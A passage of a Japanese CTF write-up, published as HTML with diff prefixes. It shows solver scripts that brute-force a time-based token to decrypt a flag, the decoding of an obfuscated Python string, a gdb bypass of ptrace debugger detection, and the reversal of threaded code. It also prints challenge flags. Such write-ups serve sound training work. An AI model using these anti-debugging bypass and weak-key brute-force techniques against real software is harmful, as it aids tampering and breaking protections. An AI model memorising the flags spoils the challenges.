+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;Ciphertext:&#39;</span>, ciphertext<span style="color:#f92672">.</span>hex())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>
+</span></span></code></pre></div><p>見てみると token を key と nonce として encrypt に渡している．
+で，この token は何かというと register 時の処理で生成される．
+で，この register 時の処理は登録時の分，秒，ユーザーネームを組み合わせて sha256 をしている．</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">Register</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> d
+</span></span><span style="display:flex;"><span>    username <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#39;Enter username: &#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> username <span style="color:#f92672">in</span> d:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;Username already exists&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>    dt_now <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>datetime<span style="color:#f92672">.</span>now()
+</span></span><span style="display:flex;"><span>    minutes <span style="color:#f92672">=</span> dt_now<span style="color:#f92672">.</span>minute
+</span></span><span style="display:flex;"><span>    sec <span style="color:#f92672">=</span> dt_now<span style="color:#f92672">.</span>second
+</span></span><span style="display:flex;"><span>    data1 <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;user: </span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">{</span>minutes<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>sec<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>    data2 <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>str(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">10</span>))
+</span></span><span style="display:flex;"><span>    d[username] <span style="color:#f92672">=</span> make_token(data1, data2)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;Registered successfully!&#39;</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;Your token is:&#39;</span>, d[username])
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_token</span>(data1: str, data2: str):
+</span></span><span style="display:flex;"><span>    sha256 <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256()
+</span></span><span style="display:flex;"><span>    sha256<span style="color:#f92672">.</span>update(data1<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    right <span style="color:#f92672">=</span> sha256<span style="color:#f92672">.</span>hexdigest()[:<span style="color:#ae81ff">20</span>]
+</span></span><span style="display:flex;"><span>    sha256<span style="color:#f92672">.</span>update(data2<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    left <span style="color:#f92672">=</span> sha256<span style="color:#f92672">.</span>hexdigest()[:<span style="color:#ae81ff">12</span>]
+</span></span><span style="display:flex;"><span>    token <span style="color:#f92672">=</span> left <span style="color:#f92672">+</span> right
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> token
+</span></span></code></pre></div><p>実際に encrypt しているのは以下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MyCipher</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, key: bytes, nonce: bytes):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>key <span style="color:#f92672">=</span> key
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>nonce <span style="color:#f92672">=</span> nonce
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>state <span style="color:#f92672">=</span> List[F2_32]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(self, plaintext: bytes) <span style="color:#f92672">-&gt;</span> bytes:
+</span></span><span style="display:flex;"><span>        encrypted_message <span style="color:#f92672">=</span> bytearray(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(plaintext)<span style="color:#f92672">//</span><span style="color:#ae81ff">64</span>):
+</span></span><span style="display:flex;"><span>            key_stream <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>__get_key_stream(self<span style="color:#f92672">.</span>key, self<span style="color:#f92672">.</span>counter <span style="color:#f92672">+</span> i, self<span style="color:#f92672">.</span>nonce)
+</span></span><span style="display:flex;"><span>            encrypted_message <span style="color:#f92672">+=</span> self<span style="color:#f92672">.</span>__xor(plaintext[i<span style="color:#f92672">*</span><span style="color:#ae81ff">64</span>:(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">64</span>], key_stream)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(plaintext) <span style="color:#f92672">%</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>            key_stream <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>__get_key_stream(self<span style="color:#f92672">.</span>key, self<span style="color:#f92672">.</span>counter <span style="color:#f92672">+</span> len(plaintext)<span style="color:#f92672">//</span><span style="color:#ae81ff">64</span>, self<span style="color:#f92672">.</span>nonce)
+</span></span><span style="display:flex;"><span>            encrypted_message <span style="color:#f92672">+=</span> self<span style="color:#f92672">.</span>__xor(plaintext[(len(plaintext)<span style="color:#f92672">//</span><span style="color:#ae81ff">64</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">64</span>:], key_stream[:len(plaintext) <span style="color:#f92672">%</span> <span style="color:#ae81ff">64</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> bytes(encrypted_message)
+</span></span></code></pre></div><p>で，じゃあ復号どうするのか，という話になるが，暗号化の時点で xor なので同じ計算をすればいい．
+solver は以下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> mycipher <span style="color:#f92672">import</span> MyCipher
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> datetime
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_token</span>(m, s, r):
+</span></span><span style="display:flex;"><span>    data1 <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;user: gureisya, </span><span style="color:#e6db74">{</span>m<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>s<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>    data2 <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;gureisya&#39;</span><span style="color:#f92672">+</span>str(r)
+</span></span><span style="display:flex;"><span>    sha256 <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256()
+</span></span><span style="display:flex;"><span>    sha256<span style="color:#f92672">.</span>update(data1<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    right <span style="color:#f92672">=</span> sha256<span style="color:#f92672">.</span>hexdigest()[:<span style="color:#ae81ff">20</span>]
+</span></span><span style="display:flex;"><span>    sha256<span style="color:#f92672">.</span>update(data2<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    left <span style="color:#f92672">=</span> sha256<span style="color:#f92672">.</span>hexdigest()[:<span style="color:#ae81ff">12</span>]
+</span></span><span style="display:flex;"><span>    token <span style="color:#f92672">=</span> left <span style="color:#f92672">+</span> right
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> token
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">Encrypt</span>(m, s, r):
+</span></span><span style="display:flex;"><span>    token <span style="color:#f92672">=</span> make_token(m, s, r)
+</span></span><span style="display:flex;"><span>    sha256 <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256()
+</span></span><span style="display:flex;"><span>    sha256<span style="color:#f92672">.</span>update(token<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> sha256<span style="color:#f92672">.</span>hexdigest()[:<span style="color:#ae81ff">32</span>]
+</span></span><span style="display:flex;"><span>    nonce <span style="color:#f92672">=</span> token[:<span style="color:#ae81ff">12</span>]
+</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> MyCipher(key<span style="color:#f92672">.</span>encode(), nonce<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    plaintext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;061ff06da6fbf8efcd2ca0c1d3b236aede3f5d4b6e8ea24179&#39;</span>
+</span></span><span style="display:flex;"><span>    ciphertext <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>encrypt(bytes<span style="color:#f92672">.</span>fromhex(plaintext))
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print(ciphertext)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> str(ciphertext)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">60</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">60</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">11</span>):
+</span></span><span style="display:flex;"><span>                dec <span style="color:#f92672">=</span> Encrypt(i, j, k)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(dec[<span style="color:#ae81ff">2</span>:<span style="color:#ae81ff">6</span>]) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;FLAG&#39;</span>:
+</span></span><span style="display:flex;"><span>                  print(<span style="color:#e6db74">&#34;OK&#34;</span>)
+</span></span><span style="display:flex;"><span>                  print(dec)
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><h2 id="rev">rev</h2>
+<h3 id="lambda">lambda</h3>
+<p>lambda で連結された python ファイルが渡されます．
+吐きそうになりながらコードを手で復元します．
+そういうツールあるんかな</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>encoded_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;16_10_13_x_6t_4_1o_9_1j_7_9_1j_1o_3_6_c_1o_6r&#39;</span>
+</span></span><span style="display:flex;"><span>segments <span style="color:#f92672">=</span> encoded_string<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;_&#39;</span>)
+</span></span><span style="display:flex;"><span>decoded_numbers <span style="color:#f92672">=</span> [int(seg, <span style="color:#ae81ff">36</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span> <span style="color:#66d9ef">for</span> seg <span style="color:#f92672">in</span> segments]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>xored_chars <span style="color:#f92672">=</span> [chr(num) <span style="color:#66d9ef">for</span> num <span style="color:#f92672">in</span> decoded_numbers]
+</span></span><span style="display:flex;"><span>subtracted_chars <span style="color:#f92672">=</span> [chr(ord(c) <span style="color:#f92672">^</span> <span style="color:#ae81ff">123</span>) <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> xored_chars]
+</span></span><span style="display:flex;"><span>added_chars <span style="color:#f92672">=</span> [chr(ord(c) <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>) <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> subtracted_chars]
+</span></span><span style="display:flex;"><span>final_chars <span style="color:#f92672">=</span> [chr(ord(c) <span style="color:#f92672">-</span> <span style="color:#ae81ff">12</span>) <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> added_chars]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(final_chars)
+</span></span><span style="display:flex;"><span>print(flag)
+</span></span></code></pre></div><h3 id="home">home</h3>
+<p>ptrace が検知されてしまうので動的解析ができません．
+なので gdb でデバッガ検知をスルーします</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gdb-peda$ b *0x5555555559f3
+</span></span><span style="display:flex;"><span>gdb-peda$ b *0x5555555558e7
+</span></span><span style="display:flex;"><span>r
+</span></span><span style="display:flex;"><span>set $rax<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>c
+</span></span><span style="display:flex;"><span>stack <span style="color:#ae81ff">50</span>
+</span></span><span style="display:flex;"><span>0200| 0x7fffffffd898 --&gt; 0x890000007b 
+</span></span><span style="display:flex;"><span>0208| 0x7fffffffd8a0 --&gt; 0x780000007d <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;}&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>0216| 0x7fffffffd8a8 --&gt; 0x710000004e <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;N&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>0224| 0x7fffffffd8b0 --&gt; 0x9700000067 
+</span></span><span style="display:flex;"><span>0232| 0x7fffffffd8b8 --&gt; 0x6b00000072 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;r&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>0240| 0x7fffffffd8c0 --&gt; 0x8300000089 
+</span></span><span style="display:flex;"><span>0248| 0x7fffffffd8c8 --&gt; 0x9000000073 
+</span></span><span style="display:flex;"><span>0256| 0x7fffffffd8d0 --&gt; 0x8600000074 
+</span></span><span style="display:flex;"><span>0264| 0x7fffffffd8d8 --&gt; 0x8100000068 
+</span></span><span style="display:flex;"><span>0272| 0x7fffffffd8e0 --&gt; 0x5d00000081 
+</span></span><span style="display:flex;"><span>0280| 0x7fffffffd8e8 --&gt; 0x2b000000a7 
+</span></span><span style="display:flex;"><span>0288| 0x7fffffffd8f0 <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;FLAG{How_did_you_get_here_4VKzTLibQmPaBZY4}&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>0296| 0x7fffffffd8f8 <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;_did_you_get_here_4VKzTLibQmPaBZY4}&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>0304| 0x7fffffffd900 <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;_get_here_4VKzTLibQmPaBZY4}&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>0312| 0x7fffffffd908 <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;e_4VKzTLibQmPaBZY4}&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>0320| 0x7fffffffd910 <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ibQmPaBZY4}&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>0328| 0x7fffffffd918 --&gt; 0xa32a1da007d3459 
+</span></span><span style="display:flex;"><span>0336| 0x7fffffffd920 --&gt; 0x7ffff7fcb7b0 --&gt; 0xe001100000243 
+</span></span><span style="display:flex;"><span>0344| 0x7fffffffd928 --&gt; 0x7fffffffde88 --&gt; 0x7fffffffe1f9 <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/home/kali/wani/rev-home/Service/chal_home&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>0352| 0x7fffffffd930 --&gt; 0x0 
+</span></span><span style="display:flex;"><span>0360| 0x7fffffffd938 --&gt; 0x7fffffffde98 --&gt; 0x7fffffffe224 <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;COLORFGBG=15;0&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>0368| 0x7fffffffd940 --&gt; 0x7ffff7ffd000 --&gt; 0x7ffff7ffe2c0 --&gt; 0x555555554000 --&gt; 0x10102464c457f 
+</span></span><span style="display:flex;"><span>0376| 0x7fffffffd948 --&gt; 0x0 
+</span></span><span style="display:flex;"><span>0384| 0x7fffffffd950 --&gt; 0x7fffffffdd70 --&gt; 0x1 
+</span></span><span style="display:flex;"><span>0392| 0x7fffffffd958 --&gt; 0x555555555a16 <span style="color:#f92672">(</span>&lt;main+159&gt;:    jmp    0x555555555a39 &lt;main+194&gt;<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h3 id="thread">thread</h3>
+<p><code>pthread_mutex_xxx</code> を使ったスレッドプログラミングです．</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>undefined8 <span style="color:#a6e22e">FUN_00101289</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>param_1)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar2;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_14;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>param_1;
+</span></span><span style="display:flex;"><span>  local_14 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (local_14 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_lock</span>((<span style="color:#66d9ef">pthread_mutex_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>DAT_00104100);
+</span></span><span style="display:flex;"><span>    iVar2 <span style="color:#f92672">=</span> (iVar1 <span style="color:#f92672">+</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>DAT_00104200 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)iVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>)) <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iVar2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>DAT_00104140 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)iVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>DAT_00104140 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)iVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iVar2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>DAT_00104140 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)iVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>DAT_00104140 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)iVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iVar2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>DAT_00104140 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)iVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>DAT_00104140 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)iVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x7f</span>
+</span></span><span style="display:flex;"><span>      ;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>DAT_00104200 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)iVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>DAT_00104200 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)iVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    local_14 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>DAT_00104200 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)iVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_unlock</span>((<span style="color:#66d9ef">pthread_mutex_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>DAT_00104100);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>重要なのはここで，インデックスに応じて計算内容が変わっている．</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>base <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x00a8</span>, <span style="color:#ae81ff">0x008a</span>, <span style="color:#ae81ff">0x00bf</span>, <span style="color:#ae81ff">0x00a5</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x02fd</span>, <span style="color:#ae81ff">0x0059</span>, <span style="color:#ae81ff">0x00de</span>, <span style="color:#ae81ff">0x0024</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0065</span>, <span style="color:#ae81ff">0x010f</span>, <span style="color:#ae81ff">0x00de</span>, <span style="color:#ae81ff">0x0023</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x015d</span>, <span style="color:#ae81ff">0x0042</span>, <span style="color:#ae81ff">0x002c</span>, <span style="color:#ae81ff">0x00de</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0009</span>, <span style="color:#ae81ff">0x0065</span>, <span style="color:#ae81ff">0x00de</span>, <span style="color:#ae81ff">0x0051</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x00ef</span>, <span style="color:#ae81ff">0x013f</span>, <span style="color:#ae81ff">0x0024</span>, <span style="color:#ae81ff">0x0053</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x015d</span>, <span style="color:#ae81ff">0x0048</span>, <span style="color:#ae81ff">0x0053</span>, <span style="color:#ae81ff">0x00de</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0009</span>, <span style="color:#ae81ff">0x0053</span>, <span style="color:#ae81ff">0x014b</span>, <span style="color:#ae81ff">0x0024</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0065</span>, <span style="color:#ae81ff">0x00de</span>, <span style="color:#ae81ff">0x0036</span>, <span style="color:#ae81ff">0x0053</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x015d</span>, <span style="color:#ae81ff">0x0012</span>, <span style="color:#ae81ff">0x004a</span>, <span style="color:#ae81ff">0x0124</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x003f</span>, <span style="color:#ae81ff">0x005f</span>, <span style="color:#ae81ff">0x014e</span>, <span style="color:#ae81ff">0x00d5</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x000b</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(base)):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        print(chr((((base[i] <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x7f</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">5</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">3</span>)), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>        print(chr(((base[i] <span style="color:#f92672">//</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">^</span><span style="color:#ae81ff">0x7f</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">5</span>),end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
+</span></span><span style="display:flex;"><span>        print(chr((((base[i] <span style="color:#f92672">-</span><span style="color:#ae81ff">5</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x7f</span>)),end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>)
+</span></span></code></pre></div><p>ハードコードされているところを見ればいいんだが，サラ見しかしてなかったせいで <code>while()</code> 文を見落としていた．</p>
+<h3 id="gates">gates</h3>
+<p>まず main は以下</p>
